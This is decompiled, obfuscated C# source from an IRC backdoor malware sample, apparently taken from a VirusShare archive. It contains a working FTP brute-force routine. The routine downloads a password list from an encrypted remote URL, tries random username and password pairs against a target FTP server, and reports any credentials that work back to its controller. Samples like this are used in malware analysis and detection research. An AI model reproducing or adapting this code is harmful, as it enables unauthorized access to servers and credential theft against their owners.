// Decompiled with JetBrains decompiler
// Type: 
// Assembly: TheBot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E6D888C-8D83-46CE-907A-18F99381A0FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Backdoor.MSIL.IrcBot.an-523fbc7f8f4234f5b7e59adb51579626a43c55d41ac674e758828414fbdebd93.exe

using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

internal class \uE015
{
  private static string[] \uE004 = new string[4]
  {
    \uE01B.\uE000("\uF222\uF227\uF22E\uF22A\uF22D\uF22A\uF230\uF237\uF231\uF222\uF237\uF22C\uF231", 62019),
    \uE01B.\uE000("\uE4B8\uE4BD\uE4B4\uE4B0\uE4B7", 58585),
    \uE01B.\uE000("\uEF54\uEF49\uEF49\uEF52", 61222),
    \uE01B.\uE000("\uEBC3\uEBC5\uEBD3\uEBC4", 60342)
  };
  private static string[] \uE003;
  private static string \uE002;
  private static int \uE001;
  private static Thread \uE000;

  internal static void \uE000(string _param0, int _param1)
  {
    \uE015.\uE002 = _param0;
    \uE015.\uE001 = _param1;
    \uE015.\uE000 = new Thread(new ThreadStart(\uE015.\uE000));
    \uE015.\uE000.Start();
  }

  internal static void \uE001() => \uE015.\uE000.Abort();

  internal static void \uE000()
  {
    if (\uE015.\uE001 == 0)
      \uE015.\uE001 = int.MaxValue;
    Random random = new Random();
    string userName = \uE015.\uE004[random.Next(\uE015.\uE004.Length)];
    \uE014.\uE002(\uE01B.\uE000("\uEF02\uEF37\uEF37\uEF22\uEF20\uEF28\uEF2A\uEF2D\uEF24\uEF63", 61251) + \uE015.\uE002 + \uE01B.\uE000("\uF72D\uF733\uF72E\uF732\uF77A\uF72F\uF729\uF73F\uF728\uF734\uF73B\uF737\uF73F\uF77A", 63322) + userName);
    while (\uE015.\uE003 == null)
      \uE015.\uE003 = \uE015.\uE000();
    bool flag = false;
    int num = 0;
    while (!flag)
    {
      if (num >= \uE015.\uE001)
        break;
      try
      {
        string password = \uE015.\uE003[random.Next(\uE015.\uE003.Length)];
        FtpWebRequest ftpWebRequest = (FtpWebRequest) WebRequest.Create(new Uri(\uE01B.\uE000("\uF59C\uF58E\uF58A\uF5C0\uF5D5\uF5D5", 62970) + \uE015.\uE002 + \uE01B.\uE000("\uEDB0", 60831)));
        ftpWebRequest.Method = \uE01B.\uE000("\uEE54\uEE56\uEE49\uEE4E", 60954);
        ftpWebRequest.UseBinary = true;
        ftpWebRequest.Credentials = (ICredentials) new NetworkCredential(userName, password);
        FtpWebResponse response = (FtpWebResponse) ftpWebRequest.GetResponse();
        StringBuilder stringBuilder = new StringBuilder();
        StreamReader streamReader = new StreamReader(response.GetResponseStream());
        for (string str = streamReader.ReadLine(); str != null; str = streamReader.ReadLine())
        {
          stringBuilder.Append(str);
          stringBuilder.Append(\uE01B.\uE000("\uF2AF", 62117));
        }
        stringBuilder.Remove(stringBuilder.ToString().LastIndexOf('\n'), 1);
        streamReader.Close();
        response.Close();
        string str1 = stringBuilder.ToString();
        char[] chArray = new char[1]{ '\n' };
        foreach (string str2 in str1.Split(chArray))
          \uE014.\uE002(str2);
        flag = true;
        \uE014.\uE002(\uE01B.\uE000("\uE834\uE829\uE83B\uE83F\uE832\uE84F", 59503) + \uE015.\uE002 + \uE01B.\uE000("\uE6D0\uE6AB", 59120) + userName + \uE01B.\uE000("\uF093\uF0EE\uF095", 61646) + password + \uE01B.\uE000("\uED5E", 60675));
      }
      catch
      {
      }
      ++num;
    }
  }

  private static string[] \uE000() => new WebClient().DownloadString(\uE01B.\uE000("\uE6EF\uE6F3\uE6F3\uE6F7\uE6BD\uE6A8\uE6A8\uE6F0\uE6E2\uE6EB\uE6E8\uE6F1\uE6E2\uE6F0\uE6E6\uE6F5\uE6E2\uE6FD\uE6A9\uE6E4\uE6E8\uE6EA\uE6A8\uE6E3\uE6EE\uE6E4\uE6A9\uE6F3\uE6FF\uE6F3", 59015)).Split('\n');
}
